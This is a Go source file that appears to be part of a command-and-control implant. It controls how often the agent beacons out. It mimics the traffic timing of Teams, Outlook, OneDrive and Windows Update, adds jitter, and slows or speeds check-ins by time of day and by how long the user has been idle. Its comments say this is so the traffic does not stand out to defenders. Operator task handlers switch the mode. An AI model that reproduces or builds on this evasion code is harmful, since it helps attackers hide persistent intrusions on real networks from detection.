//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"sync/atomic"
	"time"
)

type SleepMode int32

const (
	SleepModeDefault SleepMode = iota
	SleepModeInteractive
	SleepModeTeams
	SleepModeOutlook
	SleepModeOneDrive
	SleepModeWindowsUpdate
	SleepModeIdle
	SleepModeBackoff
)

type sleepSchedule struct {
	Base   time.Duration
	Jitter float64
	Mode   SleepMode
}

var (
	currentSleepMode int32
	scheduleTable    = map[SleepMode]sleepSchedule{
		SleepModeTeams:         {Base: 30 * time.Second, Jitter: 0.3},
		SleepModeOutlook:       {Base: 3 * time.Minute, Jitter: 0.4},
		SleepModeOneDrive:      {Base: 20 * time.Second, Jitter: 0.25},
		SleepModeWindowsUpdate: {Base: 2 * time.Hour, Jitter: 0.5},
		SleepModeIdle:          {Base: 10 * time.Minute, Jitter: 0.6},
		SleepModeBackoff:       {Base: 5 * time.Minute, Jitter: 0.8},
	}
)

func init() {
	setSleepMode(SleepModeDefault)
}

func getSleepMode() SleepMode {
	return SleepMode(atomic.LoadInt32(&currentSleepMode))
}

func setSleepMode(m SleepMode) {
	atomic.StoreInt32(&currentSleepMode, int32(m))
}

func resolveSchedule() sleepSchedule {
	mode := getSleepMode()
	if mode == SleepModeDefault {
		if Interval <= 0 {
			return sleepSchedule{Base: 200 * time.Millisecond, Jitter: 0, Mode: SleepModeInteractive}
		}
		base := time.Duration(Interval) * time.Second
		jit := float64(Jitter) / 100.0
		if inFastMode.Load() {
			base = time.Duration(FastInterval) * time.Second
		}
		return sleepSchedule{Base: base, Jitter: jit, Mode: SleepModeDefault}
	}
	if s, ok := scheduleTable[mode]; ok {
		if inFastMode.Load() {
			s.Base = time.Duration(FastInterval) * time.Second
			s.Jitter = 0.2
		}
		return s
	}
	return scheduleTable[SleepModeTeams]
}

// userActivityMultiplier shapes the beacon interval from recent user input:
// active console => faster check-ins, long idle => slower, so the agent's
// rhythm tracks a human operator rather than a fixed timer.
func userActivityMultiplier() float64 {
	idle := userIdleSeconds()
	switch {
	case idle < 60:
		return 0.6
	case idle > 600:
		return 1.8
	default:
		return 1.0
	}
}

func computeSleepDuration() time.Duration {
	now := time.Now()
	schedule := resolveSchedule()

	hour := now.Hour()
	weekday := now.Weekday()
	isWeekend := weekday == time.Saturday || weekday == time.Sunday

	var hourlyMod float64 = 1.0
	if !isWeekend {
		if hour >= 8 && hour <= 18 {
			hourlyMod = 0.7
		} else if hour >= 0 && hour <= 6 {
			hourlyMod = 2.5
		} else {
			hourlyMod = 1.3
		}
	} else {
		hourlyMod = 1.8
	}

	base := time.Duration(float64(schedule.Base) * hourlyMod)
	// Human-like cadence: shorten the gap while the user is actively at the
	// console, lengthen it after a long idle stretch. This avoids a fixed
	// clock that stands out against real user-driven traffic.
	base = time.Duration(float64(base) * userActivityMultiplier())
	jit := schedule.Jitter
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
	duration := base + variation
	duration += time.Duration(rng.Intn(500)-250) * time.Millisecond

	if duration < 50*time.Millisecond {
		duration = 50 * time.Millisecond
	}
	return duration
}

func setSleepModeFromTask(modeStr string) {
	switch modeStr {
	case "interactive":
		setSleepMode(SleepModeInteractive)
	case "teams":
		setSleepMode(SleepModeTeams)
	case "outlook":
		setSleepMode(SleepModeOutlook)
	case "onedrive":
		setSleepMode(SleepModeOneDrive)
	case "windows_update":
		setSleepMode(SleepModeWindowsUpdate)
	case "idle":
		setSleepMode(SleepModeIdle)
	case "backoff":
		setSleepMode(SleepModeBackoff)
	default:
		setSleepMode(SleepModeDefault)
	}
}

func handleSetSleepMode(task Task, res *TaskResult) {
	setSleepModeFromTask(task.Command)
	res.Output = "sleep mode set to: " + task.Command
}

func handleGetSleepMode(task Task, res *TaskResult) {
	mode := getSleepMode()
	names := map[SleepMode]string{
		SleepModeDefault:       "default",
		SleepModeInteractive:   "interactive",
		SleepModeTeams:         "teams",
		SleepModeOutlook:       "outlook",
		SleepModeOneDrive:      "onedrive",
		SleepModeWindowsUpdate: "windows_update",
		SleepModeIdle:          "idle",
		SleepModeBackoff:       "backoff",
	}
	name, ok := names[mode]
	if !ok {
		name = "unknown"
	}
	res.Output = name
}
